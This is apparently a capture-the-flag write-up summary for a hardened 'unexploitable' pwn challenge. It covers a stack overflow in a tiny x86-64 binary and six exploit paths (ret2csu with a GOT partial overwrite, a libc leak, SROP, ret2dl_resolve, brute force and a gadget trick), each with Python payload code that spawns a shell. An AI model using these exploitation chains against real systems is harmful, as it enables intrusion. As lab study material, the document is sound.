A tiny x86-64 binary (No PIE, Partial RELRO, NX, no canary) whose `main` does nothing but `sleep(3)` then `read(0, rbp-0x10, 0x100)` and returns. The binary imports only three libc functions (`read`, `sleep`, `__libc_start_main`). There is no output function, no `syscall` gadget in the binary text, and no `/bin/sh` string — hence "unexploitable."

The challenge is a hardened variant of pwnable.kr's "unexploitable" — the original had a `syscall` instruction in the binary; this version removed it, forcing solvers to manufacture one.

```text
checksec:
  Arch:     amd64-64-little
  RELRO:    Partial RELRO       # GOT writable
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE (0x400000)
```

##### Binary Disassembly

```asm
0000000000400544 <main>:
  400544: push   rbp
  400545: mov    rbp, rsp
  400548: sub    rsp, 0x10
  40054c: mov    edi, 0x3           ; sleep(3)
  400551: mov    eax, 0x0
  400556: call   400450 <sleep@plt>
  40055b: lea    rax, [rbp-0x10]    ; buf = rbp - 0x10
  40055f: mov    edx, 0x100         ; count = 256
  400564: mov    rsi, rax           ; buf
  400567: mov    edi, 0x0           ; fd = stdin
  40056c: mov    eax, 0x0
  400571: call   400430 <read@plt>
  400576: leave                     ; mov rsp,rbp; pop rbp
  400577: ret
```

##### Key Addresses

| Symbol | Address | Notes |
|--------|---------|-------|
| `read@plt` | `0x400430` | Only input primitive |
| `sleep@plt` | `0x400450` | Only other callable function |
| `GOT[read]` | `0x601000` | **Writable** — outside RELRO-protected page |
| `GOT[sleep]` | `0x601010` | Writable |
| `GOT[__libc_start_main]` | `0x601008` | Writable |
| `.bss` | `0x601028` | Writable scratch area |
| `__libc_csu_init` (CSU_POPS) | `0x4005e6` | Pop rbx/rbp/r12-r15 gadget |
| `__libc_csu_init` (CSU_CALL) | `0x4005d0` | `mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]` |
| `leave; ret` | `0x400576` | Stack pivot gadget |

#### Vulnerability

##### V1 — Stack Buffer Overflow

**Root Cause:** `main` allocates a 16-byte buffer (`rbp-0x10`) but reads up to `0x100` (256) bytes. With no stack canary, the saved rbp (at offset `+0x10`) and return address (at offset `+0x18`) are directly overwritable.

```c
// Pseudocode of main
void main() {
    char buf[0x10];        // 16-byte buffer
    sleep(3);
    read(0, buf, 0x100);   // reads 256 bytes → overflow at offset 0x18
    return;                 // leave; ret — uses overwritten rbp and rip
}
```

**Impact:** Full control of RIP and RBP. However, exploitation is severely constrained:
- **No output function** — cannot leak addresses directly
- **No `syscall`/`int 0x80` instruction** in the binary
- **No `pop rdi; ret`** or similar simple gadgets — only the `__libc_csu_init` gadget pair
- **No `/bin/sh` string** — must be written to memory
- **256-byte read** — limits stage-1 ROP chain size

##### V2 — GOT[read] Sits Outside RELRO-Protected Page

**Root Cause:** The `GNU_RELRO` segment covers `[0x600e28, 0x601000)`. After page-rounding, the loader re-protects `[0x600000, 0x601000)`. But `GOT[read]` is at exactly `0x601000` — the **first byte of the next page** — and remains **writable**.

**Impact:** A single-byte overwrite of `GOT[read]` can redirect `read@plt` to any instruction within a 256-byte range of the original `read()` entry point. In the provided glibc 2.23, `read()` is at offset `0xf6670` and its `syscall` instruction is at `0xf667e` — only the low byte differs (`0x70` → `0x7e`). Similarly, `sleep()` at `0xcb680` has nearby `syscall` instructions reachable by single-byte overwrites.

### Exploit Paths

All source paths, variants, reliability notes, diagrams, addresses, offsets, and non-exploitable findings are retained.

#### Exploit Paths

All solutions exploit V1 (stack overflow). They diverge on how they overcome the "no output, no syscall" constraints.

---

##### Path A — ret2csu + GOT Partial Overwrite → `syscall` Gadget → `execve` (Deterministic)

**Used by:** exp.py, solutions 60, 370, 1689, 1780, 10840, and many others

The canonical, fully deterministic approach. No brute-force needed.

**Concept:** Use the `__libc_csu_init` gadget pair ("ret2csu") to call `read()` with controlled arguments, overwrite a GOT entry's low byte to point at a `syscall; ret` instruction inside libc, then use the manufactured syscall gadget to call `execve("/bin/sh", 0, 0)`.

**Steps:**

1. **Stage 1 — Stack pivot to .bss:** The 256-byte overflow is too small for the full chain. Use ret2csu to call `read(0, bss, large)`, loading a longer stage-2 chain into writable `.bss`. Then `leave; ret` with `rbp = bss` pivots the stack there.

```python
# ret2csu helper: set rbx/rbp/r12-r15, then call [r12+rbx*8]
CSU_POPS = 0x4005e6  # pop rbx,rbp,r12,r13,r14,r15; add rsp,0x38; ret
CSU_CALL = 0x4005d0  # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]

# Stage 1: read(0, BSS, len(stage2)) then pivot
payload  = b"A" * 0x18                          # fill buf + saved rbp
payload += p64(CSU_POPS)
payload += csu(0, 1, READ_GOT, 0, BSS, len(s2), CSU_CALL)  # read stage2
payload += csu(0, BSS, 0, 0, 0, 0, LEAVE_RET)              # pivot
```

2. **Stage 2 — Patch GOT[read] → `syscall; ret`:** Use ret2csu to call `read(0, GOT[read], 1)`. Send exactly 1 byte (`\x7e`) — this overwrites only the low byte, turning `read()` (at `0x...670`) into the `syscall` instruction (at `0x...67e`). `read()` returns 1 → **rax = 1**.

3. **Stage 3 — Set rax = 59 (SYS_execve):** Now `call [GOT[read]]` invokes `syscall`. With rax=1, that's `SYS_write`. Call `write(fd, readable_addr, 59)` — the kernel writes 59 bytes and returns 59 → **rax = 59**.

4. **Stage 4 — `execve("/bin/sh", 0, 0)`:** Write `/bin/sh\0` to `.bss` (done in stage 2). Call `syscall` with rdi=&"/bin/sh", rsi=0, rdx=0, rax=59 → shell.

```python
# Stage 2 chain (in .bss):
s2  = b"/bin/sh\x00"
s2 += p64(CSU_POPS)
# Patch GOT[read] low byte → syscall; read returns 1 → rax=1
s2 += csu(0, 1, READ_GOT, 0, READ_GOT, 1, CSU_CALL)
# write(rax=1) → write(0, readable, 59) → rax=59
s2 += csu(0, 1, READ_GOT, 0, 0x400000, 59, CSU_CALL)
# execve(rax=59) → execve("/bin/sh", 0, 0)
s2 += csu(0, 1, READ_GOT, binsh, 0, 0, CSU_CALL)
```

**Reliability:** 100% deterministic. The low-byte overwrite is ASLR-immune since only the fixed offset within libc matters.

---

##### Path B — GOT Overwrite → `syscall` + Write Leak → `system`/one_gadget

**Used by:** Solutions 184, 278, 550, 927, 1297, 1715

Similar to Path A but adds a **libc leak** step:

1. **Overwrite GOT[read] or GOT[sleep]** low byte to point at a `syscall` instruction (or the `write` syscall entry point nearby).
2. **Invoke write(1, GOT[sleep], 8)** via ret2csu — leaks the runtime address of `sleep()` to stdout.
3. **Calculate libc base** from the leak.
4. **Second read** loads a final ROP chain using full libc gadgets: `pop rdi; ret` → `"/bin/sh"` → `system()`, or a one_gadget.

```python
# After patching GOT[read] → write's syscall:
#   write(1, GOT[sleep], 8) → leaks sleep address
sleep_addr = u64(recv(8))
libc_base = sleep_addr - libc.symbols['sleep']
# Send final chain:
pop_rdi = libc_base + 0x21102
payload = p64(pop_rdi) + p64(libc_base + binsh_off) + p64(libc_base + system_off)
```

**Reliability:** 100% deterministic. The leak makes it more flexible than Path A.

---

##### Path C — SROP (Sigreturn-Oriented Programming)

**Used by:** Solutions 138, 331, 370, 606, 709, 1172

Uses the manufactured `syscall` gadget to invoke `rt_sigreturn` (syscall 15), which restores all registers from a crafted `SigreturnFrame` on the stack.

1. **Overwrite GOT[sleep] or GOT[read]** low byte → `syscall`.
2. **Set rax = 15** by having `read()` return exactly 15 bytes.
3. **Call `syscall`** → `rt_sigreturn` restores registers from a fake `SigreturnFrame` placed on the stack, setting rax=59, rdi="/bin/sh", rsi=0, rdx=0, rip=syscall_gadget.
4. The kernel "returns" into `execve("/bin/sh", 0, 0)`.

```python
frame = SigreturnFrame()
frame.rax = 59              # SYS_execve
frame.rdi = binsh_addr      # "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr    # patched sleep@plt
# ... place frame on stack, send 0xf bytes to set rax=15, trigger sigreturn
```

**Reliability:** 100% deterministic.

---

##### Path D — ret2dl_resolve (Fake Dynamic Linking)

**Used by:** Solution 59

Constructs fake ELF structures (link_map, Elf64_Rela, Elf64_Sym, strtab entries) in writable memory and calls the PLT resolver (`_dl_runtime_resolve`) with forged relocation index. The fake symbol resolves to a one_gadget address computed as `__libc_start_main@got + offset`.

```python
# Pivot rbp to .data, return to main to read fake structures
# Then jump to dl_resolve (0x400426) with crafted link_map and reloc_index
# Fake l_addr = one_gadget_offset, fake relocation target = writable address
payload = p64(dl_resolve) + p64(fake_link_map) + p64(0)
```

**Reliability:** 100% deterministic, but complex to set up.

---

##### Path E — Brute-Force One-Gadget (Non-Deterministic)

**Used by:** Solutions 100, 821, 550 (alternative)

The laziest approach: overwrite the return address with a guessed one_gadget address directly.

1. The last 12 bits of any libc address are fixed (page-aligned base).
2. Guess the remaining 1.5 bytes (~4096 possibilities).
3. Overwrite `main`'s return address with `sleep_got + offset_to_one_gadget` (partial libc address, or just the raw guessed address).
4. Retry until the guess is correct.

```python
while True:
    r = remote(host, port)
    sleep(3)
    payload = b"A"*0x10 + b"B"*8 + b"\x6a\xd2\xc8"  # guessed one_gadget
    r.send(payload)
    try:
        r.sendline("cat /home/unexploitable/flag")
        print(r.recv())  # if we get output, the guess was right
        break
    except:
        r.close()
```

**Reliability:** ~1/4096 per attempt. With the 3-second sleep per attempt, this takes ~3.4 hours on average.

---

##### Path F — GOT Overwrite via `or byte` Gadget → `write` Leak

**Used by:** Solution 184

A creative variant using an obscure gadget found at `0x400510`:

```asm
0x400510: or byte [rbx+0x5D], bl ; ret
```

By setting `rbx = GOT[read] - 0x5d`, this gadget ORs a byte value into `GOT[read]`, transforming `read()` into `write()` without needing a separate `read()` call for the patch. This provides a write primitive to leak libc, then finish with `pop rdi; ret → "/bin/sh" → system`.

**Reliability:** 100% deterministic.

#### Exploit Primitive Summary

| Primitive | How | Reliability |
|-----------|-----|-------------|
| RIP/RBP control | Stack overflow at offset 0x18 | Deterministic |
| Controlled `read()` calls | ret2csu (`__libc_csu_init` gadgets) | Deterministic |
| Stack pivot to .bss | `leave; ret` with controlled rbp | Deterministic |
| Manufactured `syscall` | Partial GOT overwrite (1 byte, ASLR-immune) | Deterministic |
| Set rax to arbitrary value | `read()` / `write()` return value = byte count | Deterministic |
| libc leak (optional) | `write(1, GOT_entry, 8)` via manufactured syscall | Deterministic |
| Code execution | `execve` via syscall, or `system`/one_gadget after leak | Deterministic |

#### Offsets (pwnable.tw `libc_64.so.6`, glibc 2.23)

```python
# read() internal offsets
read_offset   = 0xf6670    # read() entry
syscall_in_read = 0xf667e  # syscall instruction inside read()
patch_byte_read = 0x7e     # low byte to overwrite GOT[read]

# sleep() internal offsets (alternative target)
sleep_offset  = 0xcb680
# Various nearby syscall instructions: 0xcb6de (byte 0xde), 0xcb60e (byte 0x0e), 0xcb655 (byte 0x55)

# Useful libc symbols
system        = 0x45390
__libc_start_main = 0x20740
bin_sh        = 0x18c177    # "/bin/sh" string
pop_rdi_ret   = 0x21102
one_gadgets   = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
```
### Assets and Provenance

Source write-up IDs, primary paths, technique notes, solution counts, exploit names, artifact descriptions, and provenance are retained.

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `59.md` | D | ret2dl_resolve with forged structures | Unique approach; 100% deterministic |
| `60.md` | A | ret2csu → GOT[read] patch → syscall chain | Clean stage1/stage2 |
| `100.md` | E | Brute-force one_gadget (12-bit guess) | ~3000 attempts; lazy but works |
| `138.md` | C | SROP via GOT[sleep] patch → sigreturn | Ruby; elegant |
| `184.md` | F | `or byte` gadget to create write → leak → system | Creative gadget discovery |
| `278.md` | B | ret2csu → GOT patch → write leak → system | Ruby; backup of read via __libc_start_main GOT |
| `331.md` | C | GOT[sleep] patch → SROP `execve` | Straightforward sigreturn |
| `370.md` | C | SROP with pivots through multiple reads | Stack-pivot chain through .data |
| `424.md` | A | ret2csu → self-built syscall → execve | Compact chain |
| `550.md` | B | GOT[sleep] → syscall write leak → system | Leaks via `write(1, GOT, 8)` |
| `606.md` | C | SROP split across two reads | Frame too large for one read |
| `709.md` | C | GOT[sleep] partial overwrite → SROP | Sends 0xf bytes to set rax=15 |
| `821.md` | E | Brute-force one_gadget (12-bit) | Simplest possible exploit |
| `927.md` | B | ret2csu → write leak → one_gadget | Full libc leak then one-shot |
| `1172.md` | C+B | GOT patch → SROP execve, backup: write leak | Also uses sleep as syscall |
| `1297.md` | B | ret2csu → write(1, GOT[sleep]) leak → one_gadget | Clean 3-stage approach |
| `1689.md` | A | ret2csu → GOT patch → `execve` (no leak) | Direct syscall chain; very concise |
| `1715.md` | B | GOT[sleep] → syscall `write` → leak → one_gadget | Uses `mov esi, [rsp+0x28]` gadget |
| `1780.md` | A | ret2csu → GOT[read] patch → `write` rax → `execve` | Clean no-leak chain |
| `1803.md` | B | GOT[sleep] partial overwrite → `execl` | Ruby; overwrites 2 bytes of GOT |
| `10840.md` | A | ret2csu → GOT[sleep] patch → write rax → execve | Clear step-by-step notes |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit (deterministic, no pwntools, pure sockets) |
| `desc.txt` | Challenge description |
| `artifacts/unexploitable` | Challenge binary (x86-64, No PIE, Partial RELRO) |
| `artifacts/libc_64.so.6` | Remote libc (glibc 2.23) |
| `solution/*.md` | Community write-ups (120 solutions) |
